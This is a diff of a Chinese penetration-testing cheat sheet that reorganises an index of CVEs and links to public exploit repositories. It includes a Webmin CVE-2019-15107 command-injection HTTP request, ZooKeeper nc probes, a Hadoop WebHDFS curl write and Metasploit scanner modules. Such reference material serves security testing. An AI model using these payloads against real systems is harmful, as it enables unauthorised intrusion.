@@ -8,149 +8,9 @@
 
 ---
 
-# 本地
-## Andorid
-### ESFileExplorers
-**CVE-2019-6447**
-- POC | Payload | exp
-    - [fs0c131y/ESFileExplorerOpenPortVuln](https://github.com/fs0c131y/ESFileExplorerOpenPortVuln)
-
----
-
-## Linux
-
-### Logwatch
-**CVE-2011-1018 Logwatch logwatch.pl 任意命令执行漏洞**
-- POC | Payload | exp
-    - [Logwatch Log File - Special Characters Privilege Escalation](https://www.exploit-db.com/exploits/35386)
-
-### KDE
-**KDE 4/5 KDesktopFile Command Injection**
-- POC | Payload | exp
-    - [KDE 4/5 KDesktopFile Command Injection](https://gist.githubusercontent.com/zeropwn/630832df151029cb8f22d5b6b9efaefb/raw/64aa3d30279acb207f787ce9c135eefd5e52643b/kde-kdesktopfile-command-injection.txt)
-
-### vim
-**CVE-2019-12735 Vim/Neovim Arbitrary Code Execution via Modelines**
-- POC | Payload | exp
-    - [2019-06-04_ace-vim-neovim.md](https://github.com/numirias/security/blob/master/doc/2019-06-04_ace-vim-neovim.md)
-
-### Supervisor
-**测试链接**
-- `http://<ip>:9001`
-
----
-
-## Windows
-
-### Evernote
-**Evernote 7.9**
-- 文章
-    - [Code execution – Evernote](https://securityaffairs.co/wordpress/84037/hacking/local-file-path-traversal-evernote.html)
-
-### Firefox
-**CVE-2019-9810**
-- POC | Payload | exp
-    - [0vercl0k/CVE-2019-9810](https://github.com/0vercl0k/CVE-2019-9810)
-
-### IE
-**XML External Entity Injection**
-- POC | Payload | exp
-    - http://hyp3rlinx.altervista.org/advisories/MICROSOFT-INTERNET-EXPLORER-v11-XML-EXTERNAL-ENTITY-INJECTION-0DAY.txt
-
-**CVE-2018-8174**
-- POC | Payload | exp
-    - [Yt1g3r/CVE-2018-8174_EXP: CVE-2018-8174_python](https://github.com/Yt1g3r/CVE-2018-8174_EXP)
-    - [0x09AL/CVE-2018-8174-msf: CVE-2018-8174 - VBScript memory corruption exploit.](https://github.com/0x09AL/CVE-2018-8174-msf)
-
-### Office
-**CVE-2017-0199**
-- [bhdresh/CVE-2017-0199](https://github.com/bhdresh/CVE-2017-0199)
-
-**CVE-2017-8759**
-- [Lz1y/CVE-2017-8759](https://github.com/Lz1y/CVE-2017-8759)
-
-**CVE-2017-11882**
-- POC | Payload | exp
-    - [Ridter/CVE-2017-11882](https://github.com/Ridter/CVE-2017-11882)
-    - [embedi/CVE-2017-11882](https://github.com/embedi/CVE-2017-11882)
-
-### WinRAR
-**CVE-2018-20250**
-- 文章
-    - [Extracting a 19 Year Old Code Execution from WinRAR - Check Point Research](https://research.checkpoint.com/extracting-code-execution-from-winrar/)
-
-- POC | Payload | exp
-    - [WyAtu/CVE-2018-20250](https://github.com/WyAtu/CVE-2018-20250)
-    - [Ridter/acefile](https://github.com/Ridter/acefile)
-
----
-
-## Mac
-### zoom
-- POC | Payload | exp
-    - [JLLeitschuh/zoom_vulnerability_poc](https://github.com/JLLeitschuh/zoom_vulnerability_poc)
-
----
-
-# 对外
-## 分布式
-### Hadoop
-**文章**
-- [Hadoop渗透及安全加固](http://www.polaris-lab.com/index.php/archives/187/)
-- [挖掘分布式系统——Hadoop的漏洞](https://zhuanlan.zhihu.com/p/28901633)
-
-**Hadoop 未授权访问**
-- 示例
-    ```
-    curl -i -X PUT “http://ip:50070/webhdfs/v1/NODATA4U_SECUREYOURSHIT?op=MKDIRS“
-    http://<ip>:50070
-    http://<ip>:50070/dfshealth.jsp
-    http://<ip>:50070/logs/
-    ```
-
-### ZooKeeper
-**ZooKeeper 未授权访问漏洞**
-- 文章
-    - [ZooKeeper 未授权访问漏洞](https://blog.csdn.net/qq_23936389/article/details/83826028)
-    - [攻击大数据应用：ZooKeeper](http://www.polaris-lab.com/index.php/archives/41/)
-
-- 搭建环境
-    ```bash
-    wget https://mirrors.tuna.tsinghua.edu.cn/apache/zookeeper/zookeeper-3.4.14/zookeeper-3.4.14.tar.gz
-    tar -zxvf zookeeper-3.4.14.tar.gz
-    cd zookeeper-3.4.14/
-    cd conf/
-    ```
-    ```vim
-    vim zoo.cfg  # 配置单机模式
-
-    tickTime=2000
-    dataDir=/tmp/zookeeper/data
-    dataLogDir=/tmp/zookeeper/logs
-    clientPort=2181
-    ```
-    ```bash
-    cd ..
-    bin/zkServer.sh start   # 启动
-    bin/zkCli.sh -server 127.0.0.1:2181 #连接 server
-    ```
-
-- 利用
-    ```bash
-    echo envi|nc <ip> 2181 # 打印有关服务环境的详细信息
-    echo dump |ncat <ip> 2181 # 列出未完成的会话和临时节点
-    echo reqs |ncat <ip> 2181 # 列出未完成的请求
-    echo ruok |ncat <ip> 2181 # 测试服务器是否运行在非错误状态
-    echo stat |ncat <ip> 2181 # 列出关于性能和连接的客户端的统计信息
-
-    ./zkCli.sh -server <ip>:port
-    ```
-
-**CVE-2014-085 ZooKeeper 信息泄露漏洞**
-- 文章
-    - [ZooKeeper信息泄露漏洞(CVE-2014-085)](https://blog.csdn.net/u011721501/article/details/44062617)
-
----
+# C/S
+**资源**
+- [theLSA/CS-checklist](https://github.com/theLSA/CS-checklist)
 
 ## 数据库
 ### memcached
@@ -477,6 +337,61 @@
 
 ---
 
+## 远程服务
+### Java RMI
+**JAVA RMI 反序列化远程命令执行漏洞**
+- 文章
+    - [Java RMI 反序列化漏洞检测工具的编写](https://www.anquanke.com/post/id/85681)
+    - [JAVA反序列化之 Rmi命令执行漏洞分析](https://www.freebuf.com/column/200796.html)
+    - [JAVA RMI 反序列化远程命令执行漏洞](https://blog.csdn.net/LeeHDsniper/article/details/71599504)
+
+- POC | Payload | exp
+    - [frohoff/ysoserial: A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.](https://github.com/frohoff/ysoserial)
+
+### OpenSSH
+**CVE-2018-15473 OpenSSH 用户枚举漏洞**
+- 影响范围
+    - OpenSSH 7.7及其以前版本
+
+- 文章
+    - [OpenSSH用户枚举漏洞(CVE-2018-15473)分析](https://www.anquanke.com/post/id/157607)
+    - [SSH用户枚举漏洞(CVE-2018-15473)原理学习](https://www.cnblogs.com/KevinGeorge/p/9530835.html)
+
+- POC | Payload | exp
+    - [trimstray/massh-enum](https://github.com/trimstray/massh-enum)
+    - [Rhynorater/CVE-2018-15473-Exploit](https://github.com/Rhynorater/CVE-2018-15473-Exploit)
+
+- MSF 模块
+    ```bash
+    use auxiliary/scanner/ssh/ssh_enumusers
+    set rhosts <ip>
+    set USER_FILE <aaa.txt>
+    run
+    ```
+
+### VNC
+**未授权访问漏洞**
+- MSF 模块
+    ```bash
+    use auxiliary/scanner/vnc/vnx_none_auth
+    set rhosts <ip>
+    set threads 50
+    run
+    ```
+
+---
+
+## 浏览器
+**资源**
+- [vngkv123/aSiagaming](https://github.com/vngkv123/aSiagaming)
+
+### Firefox
+**CVE-2019-9810**
+- POC | Payload | exp
+    - [0vercl0k/CVE-2019-9810](https://github.com/0vercl0k/CVE-2019-9810)
+
+---
+
 ## 文件服务
 ### ftp
 **Xlight FTP Server < 3.2.1 user 参数 SQL 注入漏洞**
@@ -571,51 +486,136 @@
 
 ---
 
-## 远程服务
-### Java RMI
-**JAVA RMI 反序列化远程命令执行漏洞**
-- 文章
-    - [Java RMI 反序列化漏洞检测工具的编写](https://www.anquanke.com/post/id/85681)
-    - [JAVA反序列化之 Rmi命令执行漏洞分析](https://www.freebuf.com/column/200796.html)
-    - [JAVA RMI 反序列化远程命令执行漏洞](https://blog.csdn.net/LeeHDsniper/article/details/71599504)
-
+## Andorid
+### ESFileExplorers
+**CVE-2019-6447**
 - POC | Payload | exp
-    - [frohoff/ysoserial: A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.](https://github.com/frohoff/ysoserial)
-
-### OpenSSH
-**CVE-2018-15473 OpenSSH 用户枚举漏洞**
-- 影响范围
-    - OpenSSH 7.7及其以前版本
-
-- 文章
-    - [OpenSSH用户枚举漏洞(CVE-2018-15473)分析](https://www.anquanke.com/post/id/157607)
-    - [SSH用户枚举漏洞(CVE-2018-15473)原理学习](https://www.cnblogs.com/KevinGeorge/p/9530835.html)
-
-- POC | Payload | exp
-    - [trimstray/massh-enum](https://github.com/trimstray/massh-enum)
-    - [Rhynorater/CVE-2018-15473-Exploit](https://github.com/Rhynorater/CVE-2018-15473-Exploit)
-
-- MSF 模块
-    ```bash
-    use auxiliary/scanner/ssh/ssh_enumusers
-    set rhosts <ip>
-    set USER_FILE <aaa.txt>
-    run
-    ```
-
-### VNC
-**未授权访问漏洞**
-- MSF 模块
-    ```bash
-    use auxiliary/scanner/vnc/vnx_none_auth
-    set rhosts <ip>
-    set threads 50
-    run
-    ```
+    - [fs0c131y/ESFileExplorerOpenPortVuln](https://github.com/fs0c131y/ESFileExplorerOpenPortVuln)
 
 ---
 
-## 虚拟化
+## Linux
+### Logwatch
+**CVE-2011-1018 Logwatch logwatch.pl 任意命令执行漏洞**
+- POC | Payload | exp
+    - [Logwatch Log File - Special Characters Privilege Escalation](https://www.exploit-db.com/exploits/35386)
+
+### KDE
+**KDE 4/5 KDesktopFile Command Injection**
+- POC | Payload | exp
+    - [KDE 4/5 KDesktopFile Command Injection](https://gist.githubusercontent.com/zeropwn/630832df151029cb8f22d5b6b9efaefb/raw/64aa3d30279acb207f787ce9c135eefd5e52643b/kde-kdesktopfile-command-injection.txt)
+
+### vim
+**CVE-2019-12735 Vim/Neovim Arbitrary Code Execution via Modelines**
+- POC | Payload | exp
+    - [2019-06-04_ace-vim-neovim.md](https://github.com/numirias/security/blob/master/doc/2019-06-04_ace-vim-neovim.md)
+
+---
+
+## Mac
+### zoom
+- POC | Payload | exp
+    - [JLLeitschuh/zoom_vulnerability_poc](https://github.com/JLLeitschuh/zoom_vulnerability_poc)
+
+---
+
+## Windows
+### Evernote
+**Evernote 7.9**
+- 文章
+    - [Code execution – Evernote](https://securityaffairs.co/wordpress/84037/hacking/local-file-path-traversal-evernote.html)
+
+### IE
+**XML External Entity Injection**
+- POC | Payload | exp
+    - http://hyp3rlinx.altervista.org/advisories/MICROSOFT-INTERNET-EXPLORER-v11-XML-EXTERNAL-ENTITY-INJECTION-0DAY.txt
+
+**CVE-2018-8174**
+- POC | Payload | exp
+    - [Yt1g3r/CVE-2018-8174_EXP: CVE-2018-8174_python](https://github.com/Yt1g3r/CVE-2018-8174_EXP)
+    - [0x09AL/CVE-2018-8174-msf: CVE-2018-8174 - VBScript memory corruption exploit.](https://github.com/0x09AL/CVE-2018-8174-msf)
+
+### Office
+**CVE-2017-0199**
+- [bhdresh/CVE-2017-0199](https://github.com/bhdresh/CVE-2017-0199)
+
+**CVE-2017-8759**
+- [Lz1y/CVE-2017-8759](https://github.com/Lz1y/CVE-2017-8759)
+
+**CVE-2017-11882**
+- POC | Payload | exp
+    - [Ridter/CVE-2017-11882](https://github.com/Ridter/CVE-2017-11882)
+    - [embedi/CVE-2017-11882](https://github.com/embedi/CVE-2017-11882)
+
+### WinRAR
+**CVE-2018-20250**
+- 文章
+    - [Extracting a 19 Year Old Code Execution from WinRAR - Check Point Research](https://research.checkpoint.com/extracting-code-execution-from-winrar/)
+
+- POC | Payload | exp
+    - [WyAtu/CVE-2018-20250](https://github.com/WyAtu/CVE-2018-20250)
+    - [Ridter/acefile](https://github.com/Ridter/acefile)
+
+---
+
+# B/S
+## 仓库
+### Nexus
+**CVE-2019-7238 Nexus Repository Manager 3 Remote Code Execution without authentication < 3.15.0**
+- 文章
+    - [一次偶遇Nexus](https://www.secpulse.com/archives/111818.html)
+
+- POC | Payload | exp
+    - [mpgn/CVE-2019-7238](https://github.com/mpgn/CVE-2019-7238)
+    - [jas502n/CVE-2019-7238](https://github.com/jas502n/CVE-2019-7238)
+
+---
+
+## 管理工具
+### Supervisor
+**测试链接**
+- `http://<ip>:9001`
+
+### Webmin
+**CVE-2019-15107**
+- 影响范围
+    - 1.890 through 1.920
+
+- 详情
+    - 在其找回密码页面中，存在一处无需权限的命令注入漏洞，通过这个漏洞攻击者即可以执行任意系统命令。
+
+- 文章
+    - [Webmin(CVE-2019-15107) 远程代码执行漏洞之 backdoor 探究](https://zhuanlan.zhihu.com/p/79287037)
+
+- POC | Payload | exp
+    - [vulhub/webmin/CVE-2019-15107/README.zh-cn.md](https://github.com/vulhub/vulhub/blob/master/webmin/CVE-2019-15107/README.zh-cn.md)
+    ```
+    POST /password_change.cgi HTTP/1.1
+    Host: your-ip:10000
+    Accept-Encoding: gzip, deflate
+    Accept: */*
+    Accept-Language: en
+    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+    Connection: close
+    Cookie: redirect=1; testing=1; sid=x; sessiontest=1
+    Referer: https://your-ip:10000/session_login.cgi
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 60
+
+    user=rootxx&pam=&expired=2&old=test|id&new1=test2&new2=test2
+    ```
+
+**CVE-2019-15642 Webmin Remote Code Execution**
+- 影响范围
+    - 1.900 through 1.920
+
+- POC | Payload | exp
+    - [jas502n/CVE-2019-15642](https://github.com/jas502n/CVE-2019-15642)
+
+---
+
+# 不太好分
+## 虚拟化 & 云平台
 **检测虚拟机**
 - **windows**
 
@@ -631,17 +631,73 @@
 
     `dmidecode -s system-product-name`
 
+### Citrix Receiver
+`注意一下 1494 和 2598 端口`
+
+**文章**
+- [CitrixReceiver平台的一次渗透测试](https://forum.90sec.com/t/topic/310)
+- [利用Citrix Receiver浏览器进行渗透](https://mp.weixin.qq.com/s/3p7e27JF6NV6C0_DEPiaqg)
 ### Docker
 **docker remote api 未授权访问**
 - POC | Payload | exp
     - `http://<ip>:2375/version`
     - [netxfly/docker-remote-api-exp](https://github.com/netxfly/docker-remote-api-exp)
 
-## 仓库
-### Nexus
-**CVE-2019-7238**
-- 文章
-    - [一次偶遇Nexus](https://www.secpulse.com/archives/111818.html)
+---
 
-- POC | Payload | exp
-    - [mpgn/CVE-2019-7238](https://github.com/mpgn/CVE-2019-7238)
+## 分布式
+### Hadoop
+**文章**
+- [Hadoop渗透及安全加固](http://www.polaris-lab.com/index.php/archives/187/)
+- [挖掘分布式系统——Hadoop的漏洞](https://zhuanlan.zhihu.com/p/28901633)
+
+**Hadoop 未授权访问**
+- 示例
+    ```
+    curl -i -X PUT “http://ip:50070/webhdfs/v1/NODATA4U_SECUREYOURSHIT?op=MKDIRS“
+    http://<ip>:50070
+    http://<ip>:50070/dfshealth.jsp
+    http://<ip>:50070/logs/
+    ```
+
+### ZooKeeper
+**ZooKeeper 未授权访问漏洞**
+- 文章
+    - [ZooKeeper 未授权访问漏洞](https://blog.csdn.net/qq_23936389/article/details/83826028)
+    - [攻击大数据应用：ZooKeeper](http://www.polaris-lab.com/index.php/archives/41/)
+
+- 搭建环境
+    ```bash
+    wget https://mirrors.tuna.tsinghua.edu.cn/apache/zookeeper/zookeeper-3.4.14/zookeeper-3.4.14.tar.gz
+    tar -zxvf zookeeper-3.4.14.tar.gz
+    cd zookeeper-3.4.14/
+    cd conf/
+    ```
+    ```vim
+    vim zoo.cfg  # 配置单机模式
+
+    tickTime=2000
+    dataDir=/tmp/zookeeper/data
+    dataLogDir=/tmp/zookeeper/logs
+    clientPort=2181
+    ```
+    ```bash
+    cd ..
+    bin/zkServer.sh start   # 启动
+    bin/zkCli.sh -server 127.0.0.1:2181 #连接 server
+    ```
+
+- 利用
+    ```bash
+    echo envi|nc <ip> 2181 # 打印有关服务环境的详细信息
+    echo dump |ncat <ip> 2181 # 列出未完成的会话和临时节点
+    echo reqs |ncat <ip> 2181 # 列出未完成的请求
+    echo ruok |ncat <ip> 2181 # 测试服务器是否运行在非错误状态
+    echo stat |ncat <ip> 2181 # 列出关于性能和连接的客户端的统计信息
+
+    ./zkCli.sh -server <ip>:port
+    ```
+
+**CVE-2014-085 ZooKeeper 信息泄露漏洞**
+- 文章
+    - [ZooKeeper信息泄露漏洞(CVE-2014-085)](https://blog.csdn.net/u011721501/article/details/44062617)
